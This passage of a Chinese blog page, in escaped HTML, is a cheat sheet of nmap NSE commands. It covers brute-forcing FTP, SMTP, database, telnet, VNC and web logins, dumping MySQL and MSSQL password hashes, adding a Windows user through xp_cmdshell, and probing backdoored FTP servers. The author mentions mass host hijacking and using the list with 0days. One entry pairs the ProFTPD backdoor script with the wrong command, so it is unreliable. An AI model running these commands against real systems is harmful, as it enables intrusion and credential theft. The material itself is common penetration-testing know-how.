class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sV</span> <span class=\"selector-tag\">-sT</span> <span class=\"selector-tag\">-Pn</span> –<span class=\"selector-tag\">open</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>也可以尝试先获取下目标机器各个服务更详细的banner信息,因为有些服务工具漏洞只能影响特定的版本,所以,提前知道一下还是非常有必要的:</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-sT</span> <span class=\"selector-tag\">-Pn</span> –<span class=\"selector-tag\">open</span> <span class=\"selector-tag\">-v</span> <span class=\"selector-tag\">banner</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ftp相关的一些漏洞检测脚本\"><a href=\"#和ftp相关的一些漏洞检测脚本\" class=\"headerlink\" title=\"和ftp相关的一些漏洞检测脚本:\"></a>和ftp相关的一些漏洞检测脚本:</h3><p>ftp-anon.nse 检查目标ftp是否允许匿名登录,光能登陆还不够,它还会自动检测目录是否可读写,如,批量ftp抓鸡</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-anon</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-brute.nse ftp爆破脚本 [只会尝试一些比较简单的弱口令,时间可能要稍微长一些(挂vpn以后这个爆破速度可能会更慢),毕竟,是直接在公网爆破]</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-vuln-cve2010-4221.nse ProFTPD 1.3.3c之前的netio.c文件中的pr_netio_telnet_gets函数中存在多个栈溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">21</span> –script ftp-vuln-cve2010<span class=\"number\">-4221.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-proftpd-backdoor.nse ProFTPD 1.3.3c 被人插后门[proftpd-1.3.3c.tar.bz2],缺省只执行id命令,可自行到脚本中它换成能直接弹shell的命令</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">21</span> –script ftp-vuln-cve2010<span class=\"number\">-4221.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>ftp-vsftpd-backdoor.nse VSFTPD v2.3.4 跟Proftp同样的问题,被人插了后门</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 21 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">ftp-vsftpd-backdoor</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ssh-相关的一些扫描脚本\"><a href=\"#和ssh-相关的一些扫描脚本\" class=\"headerlink\" title=\"和ssh 相关的一些扫描脚本:\"></a>和ssh 相关的一些扫描脚本:</h3><p>sshv1.nse sshv1是可以中间人的</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 22 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">sshv1</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和smtp-相关的一些扫描脚本\"><a href=\"#和smtp-相关的一些扫描脚本\" class=\"headerlink\" title=\"和smtp 相关的一些扫描脚本:\"></a>和smtp 相关的一些扫描脚本:</h3><p>smtp-brute.nse 简单爆破smtp</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 25 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">smtp-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-enum–users.nse 枚举目标smtp服务器的邮件用户名,前提是目标要存在此错误配置才行</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 25 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">smtp-enum-users</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2010-4344.nse Exim 4.70之前版本中的string.c文件中的string_vformat函数中存在堆溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2010<span class=\"number\">-4344.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2011-1720.nse Postfix 2.5.13之前版本，2.6.10之前的2.6.x版本，2.7.4之前的2.7.x版本和2.8.3之前的2.8.x版本,存在溢出</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2011<span class=\"number\">-1720.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>smtp-vuln-cve2011-1764.nse Exim “dkim_exim_verify_finish()” 存在格式字符串漏洞,太老基本很难遇到了</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">25</span> –script smtp-vuln-cve2011<span class=\"number\">-1764.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和pop3-相关的一些扫描脚本\"><a href=\"#和pop3-相关的一些扫描脚本\" class=\"headerlink\" title=\"和pop3 相关的一些扫描脚本:\"></a>和pop3 相关的一些扫描脚本:</h3><p>pop3-brute.nse pop简单弱口令爆破</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 110 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">pop3-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和imap-相关的一些扫描脚本\"><a href=\"#和imap-相关的一些扫描脚本\" class=\"headerlink\" title=\"和imap 相关的一些扫描脚本:\"></a>和imap 相关的一些扫描脚本:</h3><p>imap-brute.nse imap简单弱口令爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">143</span>,<span class=\"number\">993</span> –script imap-brute.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和dns-相关的一些漏洞扫描脚本\"><a href=\"#和dns-相关的一些漏洞扫描脚本\" class=\"headerlink\" title=\"和dns 相关的一些漏洞扫描脚本:\"></a>和dns 相关的一些漏洞扫描脚本:</h3><p>dns-zone-transfer.nse 检查目标ns服务器是否允许传送</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 53 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">dns-zone-transfer</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">53</span> –script dns-zone-transfer.nse –script-args dns-zone-transfer.domain=target.org -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>hostmap-ip2hosts.nse 旁站查询,目测了一下脚本,用的ip2hosts的接口,不过该接口似乎早已停用,如果想继续用,可自行到脚本里把接口部分的代码改掉</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p80</span> –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">hostmap-ip2hosts</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和各种数据库相关的扫描脚本\"><a href=\"#和各种数据库相关的扫描脚本\" class=\"headerlink\" title=\"和各种数据库相关的扫描脚本:\"></a>和各种数据库相关的扫描脚本:</h3><p>informix-brute.nse informix爆破脚本</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 9088 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">informix-brute</span><span class=\"selector-class\">.nse</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-empty-password.nse mysql 扫描root空密码</p>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql-empty-password<span class=\"selector-class\">.nse</span> mysql 扫描root空密码</span><br></pre></td></tr></table></figure>\n<p>mysql-brute.nse mysql root弱口令简单爆破</p>\n<figure class=\"highlight css\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># <span class=\"selector-tag\">nmap</span> <span class=\"selector-tag\">-p</span> 3306 –<span class=\"selector-tag\">script</span> <span class=\"selector-tag\">mysql-brute</span><span class=\"selector-class\">.nse</span> <span class=\"selector-tag\">-v</span> 192<span class=\"selector-class\">.168</span><span class=\"selector-class\">.3</span><span class=\"selector-class\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-dump-hashes.nse 导出mysql中所有用户的hash</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">3306</span> –script mysql-dump-hashes –script-args=’username=root,password=root’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<p>mysql-vuln-cve2012-2122.nse Mysql身份认证漏洞[MariaDB and MySQL 5.1.61,5.2.11, 5.3.5, 5.5.22],利用条件有些苛刻 [需要目标的mysql是自己源码编译安装的,这样的成功率相对较高]</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">3306</span> –script mysql-vuln-cve2012<span class=\"number\">-2122.</span>nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.23</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight stylus\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nmap -<span class=\"selector-tag\">p</span> <span class=\"number\">445</span> –script ms-sql-info<span class=\"selector-class\">.nse</span> -v <span class=\"number\">203.124</span>.<span class=\"number\">11.0</span>/<span class=\"number\">24</span> ms-sql-info<span class=\"selector-class\">.nse</span> 扫描C段mssql</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-info.nse –script-args mssql.instance-port=<span class=\"number\">1433</span> -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-empty-password.nse 扫描mssql sa空密码</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-empty-password.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-brute.nse sa弱口令爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-brute.nse -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>ms-sql-xp-cmdshell.nse 利用xp_cmdshell,远程执行系统命令</p>\n<figure class=\"highlight stata\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p 1433 –script ms-sql-xp-cmdshell –script-<span class=\"keyword\">args</span> mssql.username=<span class=\"keyword\">sa</span>,mssql.password=<span class=\"keyword\">sa</span>,ms-sql-xp-cmdshell.cmd=“<span class=\"keyword\">net</span> user <span class=\"keyword\">test</span> <span class=\"keyword\">test</span> /add” 192.168.3.0/24</span><br></pre></td></tr></table></figure>\n<p>ms-sql-dump-hashes.nse 导出mssql中所有的数据库用户及密码hash</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1433</span> –script ms-sql-dump-hashes -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>pgsql-brute.nse 尝试爆破postgresql</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5432</span> –script pgsql-brute -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>oracle-brute-stealth.nse 尝试爆破oracle</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script oracle-brute-stealth -p <span class=\"number\">1521</span> –script-args oracle-brute-stealth.sid=ORCL -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>oracle-brute.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script oracle-brute -p <span class=\"number\">1521</span> –script-args oracle-brute.sid=ORCL -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>mongodb-brute.nse 尝试爆破mongdb</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">27017</span> –script mongodb-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>redis-brute.nse redis爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">6379</span> –script redis-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和snmp相关的一些扫描脚本\"><a href=\"#和snmp相关的一些扫描脚本\" class=\"headerlink\" title=\"和snmp相关的一些扫描脚本:\"></a>和snmp相关的一些扫描脚本:</h3><p>snmp-brute.nse 爆破C段的snmp</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sU –script snmp-brute –script-args snmp-brute.communitiesdb=user.txt <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和telnet相关的一些扫描脚本\"><a href=\"#和telnet相关的一些扫描脚本\" class=\"headerlink\" title=\"和telnet相关的一些扫描脚本:\"></a>和telnet相关的一些扫描脚本:</h3><p>telnet-brute.nse 简单爆破telnet</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">23</span> –script telnet-brute –script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=<span class=\"number\">8</span>s -v <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和ldap服务相关的一些利用脚本\"><a href=\"#和ldap服务相关的一些利用脚本\" class=\"headerlink\" title=\"和ldap服务相关的一些利用脚本:\"></a>和ldap服务相关的一些利用脚本:</h3><p>ldap-brute.nse 简单爆破ldap</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">389</span> –script ldap-brute –script-args ldap.base=’“cn=users,dc=cqure,dc=net”‘ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"和各类web中间件-web集成环境相关的一些利用脚本\"><a href=\"#和各类web中间件-web集成环境相关的一些利用脚本\" class=\"headerlink\" title=\"和各类web中间件,web集成环境相关的一些利用脚本:\"></a>和各类web中间件,web集成环境相关的一些利用脚本:</h3><p>xmpp-brute.nse xmpp爆破</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5222</span> –script xmpp-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-iis-short-name-brute.nse 短文件扫描</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 –script http-iis-short-name-brute.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-iis-webdav-vuln.nse iis 5.0 /6.0 webadv写</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script http-iis-webdav-vuln.nse -p80,<span class=\"number\">8080</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-shellshock.nse bash远程执行</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sV -p- –script http-shellshock –script-args uri=/cgi-bin/bin,cmd=ls <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-svn-info.nse 探测目标svn</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script http-svn-info <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-drupal-enum.nse 其实对于这类的开源程序,我们根本没必要用nmap,因为搞多了,差不多一眼就能看出来</p>\n<p>http-wordpress-brute.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 -sV –script http-wordpress-brute –script-args ‘userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,http-wordpress-brute.threads=<span class=\"number\">3</span>,brute.firstonly=true’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-backup-finder.nse 扫描目标网站备份</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p80 –script=http-backup-finder <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>http-vuln-cve2015-1635.nse iis6.0远程代码执行</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sV –script http-vuln-cve* –script-args uri=’/anotheruri/’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"跟vpn相关的一些利用脚本\"><a href=\"#跟vpn相关的一些利用脚本\" class=\"headerlink\" title=\"跟vpn相关的一些利用脚本\"></a>跟vpn相关的一些利用脚本</h3><p>pptp-version.nse 识别目标pptp版本</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">1723</span> –script pptp-version.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"smb漏洞检测脚本集\"><a href=\"#smb漏洞检测脚本集\" class=\"headerlink\" title=\"smb漏洞检测脚本集:\"></a>smb漏洞检测脚本集:</h3><ul>\n<li>smb-vuln-ms08-067.nse</li>\n<li>smb-vuln-ms10-054.nse</li>\n<li>smb-vuln-ms10-061.nse</li>\n<li>smb-vuln-ms17-010.nse smb远程执行</li>\n</ul>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p445 –script smb-vuln-ms17<span class=\"number\">-010.</span>nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"检测内网嗅探\"><a href=\"#检测内网嗅探\" class=\"headerlink\" title=\"检测内网嗅探\"></a>检测内网嗅探</h3><p>sniffer-detect.nse</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -sn -Pn –script sniffer-detect.nse <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"其它的一些辅助性脚本\"><a href=\"#其它的一些辅助性脚本\" class=\"headerlink\" title=\"其它的一些辅助性脚本:\"></a>其它的一些辅助性脚本:</h3><p>rsync-brute.nse 爆破目标的rsync</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">873</span> –script rsync-brute –script-args ‘rsync-brute.module=www’ <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>rlogin-brute.nse 爆破目标的rlogin</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">513</span> –script rlogin-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>vnc-brute.nse 爆破目标的vnc</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script vnc-brute -p <span class=\"number\">5900</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>pcanywhere-brute.nse 爆破pcanywhere</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap -p <span class=\"number\">5631</span> –script=pcanywhere-brute <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>nessus-brute.nse 爆破nessus,貌似现在已经不是1241端口了,实在是太老了,直接忽略吧</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script nessus-brute -p <span class=\"number\">1241</span> <span class=\"number\">192.168</span><span class=\"number\">.3</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>nexpose-brute.nse 爆破nexpose</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script nexpose-brute -p <span class=\"number\">3780</span> <span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.0</span>/<span class=\"number\">24</span></span><br></pre></td></tr></table></figure>\n<p>shodan-api.nse 配合shodan接口进行扫描,如果自己手里有0day,这个威力还是不可小觑的</p>\n<figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># nmap –script shodan-api –script-args ‘shodan-api.target=<span class=\"number\">192.168</span><span class=\"number\">.0</span><span 